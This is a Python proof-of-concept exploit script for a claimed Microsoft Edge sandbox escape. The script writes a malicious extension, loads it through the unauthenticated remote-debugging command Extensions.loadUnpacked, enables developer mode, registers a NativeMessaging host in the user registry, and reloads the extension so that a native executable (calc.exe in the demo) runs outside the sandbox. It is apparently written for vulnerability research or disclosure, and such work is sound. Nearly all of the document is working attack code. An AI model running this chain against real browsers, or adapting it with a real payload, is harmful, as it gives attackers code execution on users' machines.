"""
Microsoft Edge CDP Extensions.loadUnpacked — Browser Sandbox Escape via NativeMessaging
Proof of Concept

Vulnerability:
    When Microsoft Edge is launched with --remote-debugging-port, the CDP command
    Extensions.loadUnpacked is available on the browser-level WebSocket target with
    no authorization check and no user consent dialog. An attacker can load an
    arbitrary MV3 extension with nativeMessaging permission, register a NativeMessaging
    host in the user registry, and achieve full browser sandbox escape.

Affected:
    Microsoft Edge 150.0.4078.65 (all versions with CDP Extensions domain, Chromium 128+)

Prerequisites:
    - Edge running: msedge.exe --remote-debugging-port=9222 --remote-allow-origins=* --user-data-dir=C:\\Temp\\edge_debug_profile
    - Python 3.x with websocket-client: pip install websocket-client
    - NativeMessaging host at C:\\Temp\\edge_nm_host.exe (PE that launches calc.exe)

Usage:
    python edge_cdp_sandbox_escape.py

Confirmed result:
    CalculatorApp.exe launches outside the Edge sandbox as a standard OS process.
"""

import json
import os
import shutil
import subprocess
import sys
import time
import winreg

import urllib.request
import websocket

sys.stdout.reconfigure(encoding="utf-8")

# Configuration
CDP_URL     = "http://127.0.0.1:9222"
NM_NAME     = "com.researcher.poc"
NM_HOST     = r"C:\Temp\edge_nm_host.exe"
NM_MANIFEST = r"C:\Temp\edge_nm_manifest.json"
EXT_DIR     = r"C:\Temp\edge_ext_poc"

_msg_id = [1]


def http_get(url):
    with urllib.request.urlopen(url, timeout=8) as r:
        return json.loads(r.read())


def cdp_send(ws, method, params=None):
    mid = _msg_id[0]
    _msg_id[0] += 1
    ws.send(json.dumps({"id": mid, "method": method, "params": params or {}}))
    ws.settimeout(30)
    for _ in range(300):
        try:
            msg = json.loads(ws.recv())
            if msg.get("id") == mid:
                return msg
        except Exception:
            continue
    return {}


def js_eval(ws, expr, await_promise=False, timeout_ms=30000):
    mid = _msg_id[0]
    _msg_id[0] += 1
    ws.send(json.dumps({
        "id": mid,
        "method": "Runtime.evaluate",
        "params": {
            "expression": expr,
            "returnByValue": True,
            "awaitPromise": await_promise,
            "timeout": timeout_ms,
        },
    }))
    ws.settimeout(timeout_ms / 1000 + 30)
    try:
        deadline = time.time() + timeout_ms / 1000 + 30
        while time.time() < deadline:
            try:
                msg = json.loads(ws.recv())
                if msg.get("id") == mid:
                    return msg
            except Exception:
                continue
    finally:
        ws.settimeout(30)
    return {}


# ── Step 1: Prepare malicious extension ──────────────────────────────────────

os.makedirs(EXT_DIR, exist_ok=True)

# Extension directory must contain only files — Edge rejects unexpected subdirectories
for entry in os.listdir(EXT_DIR):
    fp = os.path.join(EXT_DIR, entry)
    if os.path.isdir(fp):
        shutil.rmtree(fp, ignore_errors=True)

manifest = {
    "manifest_version": 3,
    "name": "Edge Security PoC",
    "version": "1.0",
    "permissions": ["nativeMessaging"],
    "background": {"service_worker": "bg.js"},
}
with open(os.path.join(EXT_DIR, "manifest.json"), "w") as f:
    json.dump(manifest, f, indent=2)

with open(os.path.join(EXT_DIR, "bg.js"), "w") as f:
    f.write(
        f"chrome.runtime.onInstalled.addListener(() => {{\n"
        f"  const port = chrome.runtime.connectNative('{NM_NAME}');\n"
        f"  port.postMessage({{action: 'exec'}});\n"
        f"  port.onMessage.addListener(m => console.log('NM:', m));\n"
        f"  port.onDisconnect.addListener(() =>\n"
        f"    console.log('NM disconnect:', chrome.runtime.lastError?.message));\n"
        f"}});\n"
    )

print("[*] Extension files prepared")
print(f"    Directory: {EXT_DIR}")
print(f"    Contents:  {sorted(os.listdir(EXT_DIR))}")


# ── Step 2: Connect to Edge CDP ───────────────────────────────────────────────

print("\n[*] Connecting to Edge CDP...")
ver = http_get(f"{CDP_URL}/json/version")
print(f"    Browser: {ver.get('Browser', '?')}")

ws_browser = websocket.create_connection(ver["webSocketDebuggerUrl"], timeout=30)
_msg_id[0] = 10


# ── Step 3: Enable developer mode via extensions tab ─────────────────────────

tabs = http_get(f"{CDP_URL}/json/list")
ext_tab = next(
    (t for t in tabs
     if "edge://extensions" in t.get("url", "") and t.get("webSocketDebuggerUrl")),
    None,
)
if not ext_tab:
    cdp_send(ws_browser, "Target.createTarget", {"url": "edge://extensions/"})
    time.sleep(2)
    tabs = http_get(f"{CDP_URL}/json/list")
    ext_tab = next(
        (t for t in tabs
         if "edge://extensions" in t.get("url", "") and t.get("webSocketDebuggerUrl")),
        None,
    )

ws_ext = None
if ext_tab:
    cdp_send(ws_browser, "Target.activateTarget", {"targetId": ext_tab["id"]})
    ws_ext = websocket.create_connection(ext_tab["webSocketDebuggerUrl"], timeout=30)
    _msg_id[0] = 100
    cdp_send(ws_ext, "Runtime.enable")
    js_eval(
        ws_ext,
        "(()=>new Promise(r=>chrome.developerPrivate"
        ".updateProfileConfiguration({inDeveloperMode:true},r)))()",
        await_promise=True,
        timeout_ms=5000,
    )
    print("[+] Developer mode enabled")
else:
    print("[!] Could not open edge://extensions tab")


# ── Step 4: Load extension via CDP — THE CORE EXPLOIT ────────────────────────

print(f"\n[*] Calling Extensions.loadUnpacked on browser WebSocket...")
print(f"    Path: {EXT_DIR}")

_msg_id[0] = 200
result = cdp_send(ws_browser, "Extensions.loadUnpacked", {"path": EXT_DIR})
print(f"    Response: {result}")

if "result" not in result or "id" not in result.get("result", {}):
    err = result.get("error", {})
    code = err.get("code")
    msg  = err.get("message", "unknown error")
    print(f"\n[-] Extensions.loadUnpacked failed: {msg} (code={code})")
    if code == -32601:
        print("    → Extensions CDP domain not available in this Edge version (requires Chromium 128+)")
    elif code == -32000:
        print("    → Wrong WebSocket target — must use browser-level WS from /json/version")
    elif code == -32600:
        print("    → Extension content rejected by validator — check manifest and directory contents")
    if ws_ext:
        ws_ext.close()
    ws_browser.close()
    sys.exit(1)

ext_id = result["result"]["id"]
print(f"\n[!!!] EXTENSION LOADED — ID: {ext_id}")


# ── Step 5: Register NativeMessaging host ────────────────────────────────────

nm_manifest_data = {
    "name": NM_NAME,
    "description": "Edge Sandbox Escape PoC",
    "type": "stdio",
    "path": NM_HOST,
    "allowed_origins": [f"chrome-extension://{ext_id}/"],
}
with open(NM_MANIFEST, "w") as f:
    json.dump(nm_manifest_data, f, indent=2)

reg_path = rf"Software\Microsoft\Edge\NativeMessagingHosts\{NM_NAME}"
with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as k:
    winreg.SetValueEx(k, "", 0, winreg.REG_SZ, NM_MANIFEST)

print(f"[+] NativeMessaging host registered")
print(f"    Host exe:  {NM_HOST} (exists={os.path.isfile(NM_HOST)})")
print(f"    Manifest:  {NM_MANIFEST}")
print(f"    Registry:  HKCU\\{reg_path}")


# ── Step 6: Reload extension → onInstalled → NM connection → code execution ──

if ws_ext:
    print(f"\n[*] Reloading extension to trigger onInstalled → NativeMessaging...")
    js_eval(
        ws_ext,
        f"(()=>new Promise(r=>chrome.developerPrivate.reload('{ext_id}',{{}},r)))()",
        await_promise=True,
        timeout_ms=15000,
    )
    print("[*] Waiting for NativeMessaging connection...")
    time.sleep(10)

    confirmed = False
    for proc in ["CalculatorApp.exe", "calc.exe"]:
        r = subprocess.run(
            ["tasklist", "/fi", f"imagename eq {proc}"],
            capture_output=True, text=True,
        )
        if proc.split(".")[0].lower() in r.stdout.lower():
            print(f"\n[!!!] {proc} IS RUNNING — SANDBOX ESCAPE CONFIRMED")
            confirmed = True

    if not confirmed:
        print("\n[!] Target process not detected in tasklist.")
        print(f"    Verify that {NM_HOST} exists and launches a detectable process.")
        print(f"    Extension ID for manual testing: {ext_id}")
else:
    print("\n[!] No extensions tab WebSocket — cannot trigger reload.")
    print(f"    Extension was loaded successfully. ID: {ext_id}")
    print(f"    Manually reload the extension or navigate to edge://extensions/")

# ── Cleanup ───────────────────────────────────────────────────────────────────
if ws_ext:
    ws_ext.close()
ws_browser.close()
print("\n[done]")
